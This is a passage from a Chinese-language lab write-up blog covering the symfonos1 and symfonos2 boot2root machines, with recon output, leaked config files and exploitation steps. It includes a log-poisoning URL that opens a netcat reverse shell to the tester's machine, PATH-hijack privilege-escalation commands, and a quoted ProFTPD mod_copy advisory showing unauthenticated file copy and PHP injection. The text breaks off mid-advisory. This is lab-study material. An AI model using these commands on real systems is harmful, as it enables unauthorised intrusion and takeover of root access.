<p><img data-src="./symfonos1/10.png" alt></p>
<ul>
<li>反弹<code>shell</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;symfonos.local&#x2F;h3l105&#x2F;wp-content&#x2F;plugins&#x2F;mail-masta&#x2F;inc&#x2F;campaign&#x2F;count_of_send.php?pl&#x3D;&#x2F;var&#x2F;mail&#x2F;helios&amp;cmd&#x3D;nc -e &#x2F;bin&#x2F;sh 192.168.43.86 7777</span><br></pre></td></tr></table></figure>

<p><img data-src="./symfonos1/11.png" alt></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><img data-src="./symfonos1/12.png" alt></p>
<p><img data-src="./symfonos1/13.png" alt></p>
<p><img data-src="./symfonos1/14.png" alt></p>
<ul>
<li><code>IDA</code>查看伪代码</li>
</ul>
<p><img data-src="./symfonos1/15.png" alt></p>
<p>发现调用 <code>curl</code>命令， 修改环境变量提权</p>
<p><a href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/" target="_blank" rel="noopener">https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp /bin/sh /tmp/curl</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">/opt/statuscheck</span><br></pre></td></tr></table></figure>

<p><img data-src="./symfonos1/16.png" alt></p>
<ul>
<li>换个姿势</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">touch /tmp/curl</span><br><span class="line">echo "/bin/sh" &gt;&gt; /tmp/curl</span><br><span class="line">chmod +x /tmp/curl</span><br><span class="line">/opt/statuscheck</span><br></pre></td></tr></table></figure>

<p><img data-src="./symfonos1/17.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>symfonos</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>symfonos</tag>
      </tags>
  </entry>
  <entry>
    <title>symfonos2</title>
    <url>/2021/03/27/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/symfonos2/</url>
    <content><![CDATA[<h1 id="symfonos2"><a href="#symfonos2" class="headerlink" title="symfonos2"></a>symfonos2</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>symfonos2</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:fa:35:f2, IPv4: 192.168.43.86</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1    fe:ee:df:63:84:20       (Unknown: locally administered)</span><br><span class="line">192.168.43.188  d0:c6:37:be:7e:b3       Intel Corporate</span><br><span class="line">192.168.43.207  00:0c:29:14:45:41       VMware, Inc.</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.953 seconds (131.08 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.43.207</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.43.207</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# nmap -sV -A -p 1-65535 192.168.43.207</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-27 03:06 EDT</span><br><span class="line">Nmap scan report for 192.168.43.207</span><br><span class="line">Host is up (0.00079s latency).</span><br><span class="line">Not shown: 65530 closed ports</span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">21/tcp  open  ftp         ProFTPD 1.3.5</span><br><span class="line">22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 9d:f8:5f:87:20:e5:8c:fa:68:47:7d:71:62:08:ad:b9 (RSA)</span><br><span class="line">|   256 04:2a:bb:06:56:ea:d1:93:1c:d2:78:0a:00:46:9d:85 (ECDSA)</span><br><span class="line">|_  256 28:ad:ac:dc:7e:2a:1c:f6:4c:6b:47:f2:d6:22:5b:52 (ED25519)</span><br><span class="line">80/tcp  open  http        WebFS httpd 1.21</span><br><span class="line">|_http-server-header: webfs/1.21</span><br><span class="line">|_http-title: Site doesn't have a title (text/html).</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)</span><br><span class="line">MAC Address: 00:0C:29:14:45:41 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: Host: SYMFONOS2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: 0s</span><br><span class="line">|_nbstat: NetBIOS name: SYMFONOS2, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.5.16-Debian)</span><br><span class="line">|   Computer name: symfonos2</span><br><span class="line">|   NetBIOS computer name: SYMFONOS2\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: symfonos2</span><br><span class="line">|_  System time: 2021-03-27T02:06:23-05:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2021-03-27T07:06:23</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.79 ms 192.168.43.207</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 14.89 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./symfonos2/1.png" alt></p>
<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><p><img data-src="./symfonos2/2.png" alt></p>
<h3 id="Samba-smbmap"><a href="#Samba-smbmap" class="headerlink" title="Samba(smbmap)"></a>Samba(smbmap)</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">smbmap -H 192.168.43.207</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# smbmap -H 192.168.43.207</span><br><span class="line">[+] Guest session       IP: 192.168.43.207:445  Name: 192.168.43.207                                    </span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        print$                                                  NO ACCESS       Printer Drivers</span><br><span class="line">        anonymous                                               READ ONLY</span><br><span class="line">        IPC$                                                    NO ACCESS       IPC Service (Samba 4.5.16-Debian)</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 登录 smb</span></span><br><span class="line">smbclient //192.168.43.207/anonymous  --user=symfonos</span><br></pre></td></tr></table></figure>

<p><img data-src="./symfonos2/3.png" alt></p>
<ul>
<li><code>log.txt</code>文件内容</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@symfonos2:~# cat &#x2F;etc&#x2F;shadow &gt; &#x2F;var&#x2F;backups&#x2F;shadow.bak</span><br><span class="line">root@symfonos2:~# cat &#x2F;etc&#x2F;samba&#x2F;smb.conf</span><br><span class="line">#</span><br><span class="line"># Sample configuration file for the Samba suite for Debian GNU&#x2F;Linux.</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line"># This is the main Samba configuration file. You should read the</span><br><span class="line"># smb.conf(5) manual page in order to understand the options listed</span><br><span class="line"># here. Samba has a huge number of configurable options most of which </span><br><span class="line"># are not shown in this example</span><br><span class="line">#</span><br><span class="line"># Some options that are often worth tuning have been included as</span><br><span class="line"># commented-out examples in this file.</span><br><span class="line">#  - When such options are commented with &quot;;&quot;, the proposed setting</span><br><span class="line">#    differs from the default Samba behaviour</span><br><span class="line">#  - When commented with &quot;#&quot;, the proposed setting is the default</span><br><span class="line">#    behaviour of Samba but the option is considered important</span><br><span class="line">#    enough to be mentioned here</span><br><span class="line">#</span><br><span class="line"># NOTE: Whenever you modify this file you should run the command</span><br><span class="line"># &quot;testparm&quot; to check that you have not made any basic syntactic </span><br><span class="line"># errors. </span><br><span class="line"></span><br><span class="line">#&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Global Settings &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">[global]</span><br><span class="line"></span><br><span class="line">## Browsing&#x2F;Identification ###</span><br><span class="line"></span><br><span class="line"># Change this to the workgroup&#x2F;NT-domain name your Samba server will part of</span><br><span class="line">   workgroup &#x3D; WORKGROUP</span><br><span class="line"></span><br><span class="line"># Windows Internet Name Serving Support Section:</span><br><span class="line"># WINS Support - Tells the NMBD component of Samba to enable its WINS Server</span><br><span class="line">#   wins support &#x3D; no</span><br><span class="line"></span><br><span class="line"># WINS Server - Tells the NMBD components of Samba to be a WINS Client</span><br><span class="line"># Note: Samba can be either a WINS Server, or a WINS Client, but NOT both</span><br><span class="line">;   wins server &#x3D; w.x.y.z</span><br><span class="line"></span><br><span class="line"># This will prevent nmbd to search for NetBIOS names through DNS.</span><br><span class="line">   dns proxy &#x3D; no</span><br><span class="line"></span><br><span class="line">#### Networking ####</span><br><span class="line"></span><br><span class="line"># The specific set of interfaces &#x2F; networks to bind to</span><br><span class="line"># This can be either the interface name or an IP address&#x2F;netmask;</span><br><span class="line"># interface names are normally preferred</span><br><span class="line">;   interfaces &#x3D; 127.0.0.0&#x2F;8 eth0</span><br><span class="line"></span><br><span class="line"># Only bind to the named interfaces and&#x2F;or networks; you must use the</span><br><span class="line"># &#39;interfaces&#39; option above to use this.</span><br><span class="line"># It is recommended that you enable this feature if your Samba machine is</span><br><span class="line"># not protected by a firewall or is a firewall itself.  However, this</span><br><span class="line"># option cannot handle dynamic or non-broadcast interfaces correctly.</span><br><span class="line">;   bind interfaces only &#x3D; yes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### Debugging&#x2F;Accounting ####</span><br><span class="line"></span><br><span class="line"># This tells Samba to use a separate log file for each machine</span><br><span class="line"># that connects</span><br><span class="line">   log file &#x3D; &#x2F;var&#x2F;log&#x2F;samba&#x2F;log.%m</span><br><span class="line"></span><br><span class="line"># Cap the size of the individual log files (in KiB).</span><br><span class="line">   max log size &#x3D; 1000</span><br><span class="line"></span><br><span class="line"># If you want Samba to only log through syslog then set the following</span><br><span class="line"># parameter to &#39;yes&#39;.</span><br><span class="line">#   syslog only &#x3D; no</span><br><span class="line"></span><br><span class="line"># We want Samba to log a minimum amount of information to syslog. Everything</span><br><span class="line"># should go to &#x2F;var&#x2F;log&#x2F;samba&#x2F;log.&#123;smbd,nmbd&#125; instead. If you want to log</span><br><span class="line"># through syslog you should set the following parameter to something higher.</span><br><span class="line">   syslog &#x3D; 0</span><br><span class="line"></span><br><span class="line"># Do something sensible when Samba crashes: mail the admin a backtrace</span><br><span class="line">   panic action &#x3D; &#x2F;usr&#x2F;share&#x2F;samba&#x2F;panic-action %d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">####### Authentication #######</span><br><span class="line"></span><br><span class="line"># Server role. Defines in which mode Samba will operate. Possible</span><br><span class="line"># values are &quot;standalone server&quot;, &quot;member server&quot;, &quot;classic primary</span><br><span class="line"># domain controller&quot;, &quot;classic backup domain controller&quot;, &quot;active</span><br><span class="line"># directory domain controller&quot;. </span><br><span class="line">#</span><br><span class="line"># Most people will want &quot;standalone sever&quot; or &quot;member server&quot;.</span><br><span class="line"># Running as &quot;active directory domain controller&quot; will require first</span><br><span class="line"># running &quot;samba-tool domain provision&quot; to wipe databases and create a</span><br><span class="line"># new domain.</span><br><span class="line">   server role &#x3D; standalone server</span><br><span class="line"></span><br><span class="line"># If you are using encrypted passwords, Samba will need to know what</span><br><span class="line"># password database type you are using.  </span><br><span class="line">   passdb backend &#x3D; tdbsam</span><br><span class="line"></span><br><span class="line">   obey pam restrictions &#x3D; yes</span><br><span class="line"></span><br><span class="line"># This boolean parameter controls whether Samba attempts to sync the Unix</span><br><span class="line"># password with the SMB password when the encrypted SMB password in the</span><br><span class="line"># passdb is changed.</span><br><span class="line">   unix password sync &#x3D; yes</span><br><span class="line"></span><br><span class="line"># For Unix password sync to work on a Debian GNU&#x2F;Linux system, the following</span><br><span class="line"># parameters must be set (thanks to Ian Kahan &lt;&lt;kahan@informatik.tu-muenchen.de&gt; for</span><br><span class="line"># sending the correct chat script for the passwd program in Debian Sarge).</span><br><span class="line">   passwd program &#x3D; &#x2F;usr&#x2F;bin&#x2F;passwd %u</span><br><span class="line">   passwd chat &#x3D; *Enter\snew\s*\spassword:* %n\n *Retype\snew\s*\spassword:* %n\n *password\supdated\ssuccessfully* .</span><br><span class="line"></span><br><span class="line"># This boolean controls whether PAM will be used for password changes</span><br><span class="line"># when requested by an SMB client instead of the program listed in</span><br><span class="line"># &#39;passwd program&#39;. The default is &#39;no&#39;.</span><br><span class="line">   pam password change &#x3D; yes</span><br><span class="line"></span><br><span class="line"># This option controls how unsuccessful authentication attempts are mapped</span><br><span class="line"># to anonymous connections</span><br><span class="line">   map to guest &#x3D; bad user</span><br><span class="line"></span><br><span class="line">########## Domains ###########</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># The following settings only takes effect if &#39;server role &#x3D; primary</span><br><span class="line"># classic domain controller&#39;, &#39;server role &#x3D; backup domain controller&#39;</span><br><span class="line"># or &#39;domain logons&#39; is set </span><br><span class="line">#</span><br><span class="line"></span><br><span class="line"># It specifies the location of the user&#39;s</span><br><span class="line"># profile directory from the client point of view) The following</span><br><span class="line"># required a [profiles] share to be setup on the samba server (see</span><br><span class="line"># below)</span><br><span class="line">;   logon path &#x3D; \\%N\profiles\%U</span><br><span class="line"># Another common choice is storing the profile in the user&#39;s home directory</span><br><span class="line"># (this is Samba&#39;s default)</span><br><span class="line">#   logon path &#x3D; \\%N\%U\profile</span><br><span class="line"></span><br><span class="line"># The following setting only takes effect if &#39;domain logons&#39; is set</span><br><span class="line"># It specifies the location of a user&#39;s home directory (from the client</span><br><span class="line"># point of view)</span><br><span class="line">;   logon drive &#x3D; H:</span><br><span class="line">#   logon home &#x3D; \\%N\%U</span><br><span class="line"></span><br><span class="line"># The following setting only takes effect if &#39;domain logons&#39; is set</span><br><span class="line"># It specifies the script to run during logon. The script must be stored</span><br><span class="line"># in the [netlogon] share</span><br><span class="line"># NOTE: Must be store in &#39;DOS&#39; file format convention</span><br><span class="line">;   logon script &#x3D; logon.cmd</span><br><span class="line"></span><br><span class="line"># This allows Unix users to be created on the domain controller via the SAMR</span><br><span class="line"># RPC pipe.  The example command creates a user account with a disabled Unix</span><br><span class="line"># password; please adapt to your needs</span><br><span class="line">; add user script &#x3D; &#x2F;usr&#x2F;sbin&#x2F;adduser --quiet --disabled-password --gecos &quot;&quot; %u</span><br><span class="line"></span><br><span class="line"># This allows machine accounts to be created on the domain controller via the </span><br><span class="line"># SAMR RPC pipe.  </span><br><span class="line"># The following assumes a &quot;machines&quot; group exists on the system</span><br><span class="line">; add machine script  &#x3D; &#x2F;usr&#x2F;sbin&#x2F;useradd -g machines -c &quot;%u machine account&quot; -d &#x2F;var&#x2F;lib&#x2F;samba -s &#x2F;bin&#x2F;false %u</span><br><span class="line"></span><br><span class="line"># This allows Unix groups to be created on the domain controller via the SAMR</span><br><span class="line"># RPC pipe.  </span><br><span class="line">; add group script &#x3D; &#x2F;usr&#x2F;sbin&#x2F;addgroup --force-badname %g</span><br><span class="line"></span><br><span class="line">############ Misc ############</span><br><span class="line"></span><br><span class="line"># Using the following line enables you to customise your configuration</span><br><span class="line"># on a per machine basis. The %m gets replaced with the netbios name</span><br><span class="line"># of the machine that is connecting</span><br><span class="line">;   include &#x3D; &#x2F;home&#x2F;samba&#x2F;etc&#x2F;smb.conf.%m</span><br><span class="line"></span><br><span class="line"># Some defaults for winbind (make sure you&#39;re not using the ranges</span><br><span class="line"># for something else.)</span><br><span class="line">;   idmap uid &#x3D; 10000-20000</span><br><span class="line">;   idmap gid &#x3D; 10000-20000</span><br><span class="line">;   template shell &#x3D; &#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line"># Setup usershare options to enable non-root users to share folders</span><br><span class="line"># with the net usershare command.</span><br><span class="line"></span><br><span class="line"># Maximum number of usershare. 0 (default) means that usershare is disabled.</span><br><span class="line">;   usershare max shares &#x3D; 100</span><br><span class="line"></span><br><span class="line"># Allow users who&#39;ve been granted usershare privileges to create</span><br><span class="line"># public shares, not just authenticated ones</span><br><span class="line">   usershare allow guests &#x3D; yes</span><br><span class="line"></span><br><span class="line">#&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Share Definitions &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">[homes]</span><br><span class="line">   comment &#x3D; Home Directories</span><br><span class="line">   browseable &#x3D; no</span><br><span class="line"></span><br><span class="line"># By default, the home directories are exported read-only. Change the</span><br><span class="line"># next parameter to &#39;no&#39; if you want to be able to write to them.</span><br><span class="line">   read only &#x3D; yes</span><br><span class="line"></span><br><span class="line"># File creation mask is set to 0700 for security reasons. If you want to</span><br><span class="line"># create files with group&#x3D;rw permissions, set next parameter to 0775.</span><br><span class="line">   create mask &#x3D; 0700</span><br><span class="line"></span><br><span class="line"># Directory creation mask is set to 0700 for security reasons. If you want to</span><br><span class="line"># create dirs. with group&#x3D;rw permissions, set next parameter to 0775.</span><br><span class="line">   directory mask &#x3D; 0700</span><br><span class="line"></span><br><span class="line"># By default, \\server\username shares can be connected to by anyone</span><br><span class="line"># with access to the samba server.</span><br><span class="line"># The following parameter makes sure that only &quot;username&quot; can connect</span><br><span class="line"># to \\server\username</span><br><span class="line"># This might need tweaking when using external authentication schemes</span><br><span class="line">   valid users &#x3D; %S</span><br><span class="line"></span><br><span class="line"># Un-comment the following and create the netlogon directory for Domain Logons</span><br><span class="line"># (you need to configure Samba to act as a domain controller too.)</span><br><span class="line">;[netlogon]</span><br><span class="line">;   comment &#x3D; Network Logon Service</span><br><span class="line">;   path &#x3D; &#x2F;home&#x2F;samba&#x2F;netlogon</span><br><span class="line">;   guest ok &#x3D; yes</span><br><span class="line">;   read only &#x3D; yes</span><br><span class="line"></span><br><span class="line"># Un-comment the following and create the profiles directory to store</span><br><span class="line"># users profiles (see the &quot;logon path&quot; option above)</span><br><span class="line"># (you need to configure Samba to act as a domain controller too.)</span><br><span class="line"># The path below should be writable by all users so that their</span><br><span class="line"># profile directory may be created the first time they log on</span><br><span class="line">;[profiles]</span><br><span class="line">;   comment &#x3D; Users profiles</span><br><span class="line">;   path &#x3D; &#x2F;home&#x2F;samba&#x2F;profiles</span><br><span class="line">;   guest ok &#x3D; no</span><br><span class="line">;   browseable &#x3D; no</span><br><span class="line">;   create mask &#x3D; 0600</span><br><span class="line">;   directory mask &#x3D; 0700</span><br><span class="line"></span><br><span class="line">[printers]</span><br><span class="line">   comment &#x3D; All Printers</span><br><span class="line">   browseable &#x3D; no</span><br><span class="line">   path &#x3D; &#x2F;var&#x2F;spool&#x2F;samba</span><br><span class="line">   printable &#x3D; yes</span><br><span class="line">   guest ok &#x3D; no</span><br><span class="line">   read only &#x3D; yes</span><br><span class="line">   create mask &#x3D; 0700</span><br><span class="line"></span><br><span class="line"># Windows clients look for this share name as a source of downloadable</span><br><span class="line"># printer drivers</span><br><span class="line">[print$]</span><br><span class="line">   comment &#x3D; Printer Drivers</span><br><span class="line">   path &#x3D; &#x2F;var&#x2F;lib&#x2F;samba&#x2F;printers</span><br><span class="line">   browseable &#x3D; yes</span><br><span class="line">   read only &#x3D; yes</span><br><span class="line">   guest ok &#x3D; no</span><br><span class="line"># Uncomment to allow remote administration of Windows print drivers.</span><br><span class="line"># You may need to replace &#39;lpadmin&#39; with the name of the group your</span><br><span class="line"># admin users are members of.</span><br><span class="line"># Please note that you also need to set appropriate Unix permissions</span><br><span class="line"># to the drivers directory for these users to have write rights in it</span><br><span class="line">;   write list &#x3D; root, @lpadmin</span><br><span class="line"></span><br><span class="line">[anonymous]</span><br><span class="line">   path &#x3D; &#x2F;home&#x2F;aeolus&#x2F;share</span><br><span class="line">   browseable &#x3D; yes</span><br><span class="line">   read only &#x3D; yes</span><br><span class="line">   guest ok &#x3D; yes</span><br><span class="line"></span><br><span class="line">root@symfonos2:~# cat &#x2F;usr&#x2F;local&#x2F;etc&#x2F;proftpd.conf</span><br><span class="line"># This is a basic ProFTPD configuration file (rename it to </span><br><span class="line"># &#39;proftpd.conf&#39; for actual use.  It establishes a single server</span><br><span class="line"># and a single anonymous login.  It assumes that you have a user&#x2F;group</span><br><span class="line"># &quot;nobody&quot; and &quot;ftp&quot; for normal operation and anon.</span><br><span class="line"></span><br><span class="line">ServerName			&quot;ProFTPD Default Installation&quot;</span><br><span class="line">ServerType			standalone</span><br><span class="line">DefaultServer			on</span><br><span class="line"></span><br><span class="line"># Port 21 is the standard FTP port.</span><br><span class="line">Port				21</span><br><span class="line"></span><br><span class="line"># Don&#39;t use IPv6 support by default.</span><br><span class="line">UseIPv6				off</span><br><span class="line"></span><br><span class="line"># Umask 022 is a good standard umask to prevent new dirs and files</span><br><span class="line"># from being group and world writable.</span><br><span class="line">Umask				022</span><br><span class="line"></span><br><span class="line"># To prevent DoS attacks, set the maximum number of child processes</span><br><span class="line"># to 30.  If you need to allow more than 30 concurrent connections</span><br><span class="line"># at once, simply increase this value.  Note that this ONLY works</span><br><span class="line"># in standalone mode, in inetd mode you should use an inetd server</span><br><span class="line"># that allows you to limit maximum number of processes per service</span><br><span class="line"># (such as xinetd).</span><br><span class="line">MaxInstances			30</span><br><span class="line"></span><br><span class="line"># Set the user and group under which the server will run.</span><br><span class="line">User				aeolus</span><br><span class="line">Group				aeolus</span><br><span class="line"></span><br><span class="line"># To cause every FTP user to be &quot;jailed&quot; (chrooted) into their home</span><br><span class="line"># directory, uncomment this line.</span><br><span class="line">#DefaultRoot ~</span><br><span class="line"></span><br><span class="line"># Normally, we want files to be overwriteable.</span><br><span class="line">AllowOverwrite		on</span><br><span class="line"></span><br><span class="line"># Bar use of SITE CHMOD by default</span><br><span class="line">&lt;Limit SITE_CHMOD&gt;</span><br><span class="line">  DenyAll</span><br><span class="line">&lt;&#x2F;Limit&gt;</span><br><span class="line"></span><br><span class="line"># A basic anonymous configuration, no upload directories.  If you do not</span><br><span class="line"># want anonymous users, simply delete this entire &lt;Anonymous&gt; section.</span><br><span class="line">&lt;Anonymous ~ftp&gt;</span><br><span class="line">  User				ftp</span><br><span class="line">  Group				ftp</span><br><span class="line"></span><br><span class="line">  # We want clients to be able to login with &quot;anonymous&quot; as well as &quot;ftp&quot;</span><br><span class="line">  UserAlias			anonymous ftp</span><br><span class="line"></span><br><span class="line">  # Limit the maximum number of anonymous logins</span><br><span class="line">  MaxClients			10</span><br><span class="line"></span><br><span class="line">  # We want &#39;welcome.msg&#39; displayed at login, and &#39;.message&#39; displayed</span><br><span class="line">  # in each newly chdired directory.</span><br><span class="line">  #DisplayLogin			welcome.msg</span><br><span class="line">  #DisplayChdir			.message</span><br><span class="line"></span><br><span class="line">  # Limit WRITE everywhere in the anonymous chroot</span><br><span class="line">  &lt;Limit WRITE&gt;</span><br><span class="line">    DenyAll</span><br><span class="line">  &lt;&#x2F;Limit&gt;</span><br><span class="line">&lt;&#x2F;Anonymous&gt;</span><br></pre></td></tr></table></figure>

<p>提起到两个信息点</p>
<ul>
<li>cat /etc/shadow &gt; /var/backups/shadow.bak</li>
<li>发现账号密码 <code>ftp/ftp  aeolus/aeolus</code></li>
</ul>
<p>账号<code>ftp</code>登录失败</p>
<p>尝试<code>smb</code>失败</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">smbclient //192.168.43.207/aeolus  --user=aeolus%aeolus</span><br><span class="line">smbclient //192.168.43.207/ftp  --user=ftp%ftp</span><br></pre></td></tr></table></figure>

<p>尝试<code>ssh</code>失败</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh aeolus@192.168.43.207</span><br><span class="line">ssh ftp@192.168.43.207</span><br></pre></td></tr></table></figure>

<h3 id="ProFTPd-1-3-5-File-Copy"><a href="#ProFTPd-1-3-5-File-Copy" class="headerlink" title="ProFTPd 1.3.5 - File Copy"></a>ProFTPd 1.3.5 - File Copy</h3><p><img data-src="./symfonos2/4.png" alt></p>
<ul>
<li>瞧一瞧</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Description TJ Saunders 2015-04-07 16:35:03 UTC</span><br><span class="line">Vadim Melihow reported a critical issue with proftpd installations that use the</span><br><span class="line">mod_copy module's SITE CPFR/SITE CPTO commands; mod_copy allows these commands</span><br><span class="line">to be used by *unauthenticated clients*:</span><br><span class="line"></span><br><span class="line">---------------------------------</span><br><span class="line">Trying 80.150.216.115...</span><br><span class="line">Connected to 80.150.216.115.</span><br><span class="line">Escape character is '^]'.</span><br><span class="line">220 ProFTPD 1.3.5rc3 Server (Debian) [::ffff:80.150.216.115]</span><br><span class="line">site help</span><br><span class="line">214-The following SITE commands are recognized (* =&gt;'s unimplemented)</span><br><span class="line">214-CPFR &lt;sp&gt; pathname</span><br><span class="line">214-CPTO &lt;sp&gt; pathname</span><br><span class="line">214-UTIME &lt;sp&gt; YYYYMMDDhhmm[ss] &lt;sp&gt; path</span><br><span class="line">214-SYMLINK &lt;sp&gt; source &lt;sp&gt; destination</span><br><span class="line">214-RMDIR &lt;sp&gt; path</span><br><span class="line">214-MKDIR &lt;sp&gt; path</span><br><span class="line">214-The following SITE extensions are recognized:</span><br><span class="line">214-RATIO -- show all ratios in effect</span><br><span class="line">214-QUOTA</span><br><span class="line">214-HELP</span><br><span class="line">214-CHGRP</span><br><span class="line">214-CHMOD</span><br><span class="line">214 Direct comments to root@www01a</span><br><span class="line">site cpfr /etc/passwd</span><br><span class="line">350 File or directory exists, ready for destination name</span><br><span class="line">site cpto /tmp/passwd.copy</span><br><span class="line">250 Copy successful</span><br><span class="line">-----------------------------------------</span><br><span class="line"></span><br><span class="line">He provides another, scarier example:</span><br><span class="line"></span><br><span class="line">------------------------------</span><br><span class="line">site cpfr /etc/passwd</span><br><span class="line">350 File or directory exists, ready for destination name</span><br><span class="line">site cpto &lt;?php phpinfo(); ?&gt;</span><br><span class="line">550 cpto: Permission denied</span><br><span class="line">site cpfr /proc/self/fd/3</span><br><span class="line">350 File or directory exists, ready for destination name</span><br><span class="line">site cpto /var/www/test.php</span><br><span class="line"></span><br><span class="line">test.php now contains</span><br><span class="line">----------------------</span><br><span class="line">2015-04-04 02:01:13,159 slon-P5Q proftpd[16255] slon-P5Q</span><br><span class="line">(slon-P5Q.lan[192.168.3.193]): error rewinding scoreboard: Invalid argument</span><br><span class="line">2015-04-04 02:01:13,159 slon-P5Q proftpd[16255] slon-P5Q</span><br><span class="line">(slon-P5Q.lan[192.168.3.193]): FTP session opened.</span><br><span class="line">2015-04-04 02:01:27,943 slon-P5Q proftpd[16255] slon-P5Q</span><br><span class="line">(slon-P5Q.lan[192.168.3.193]): error opening destination file '/&lt;?php</span><br><span 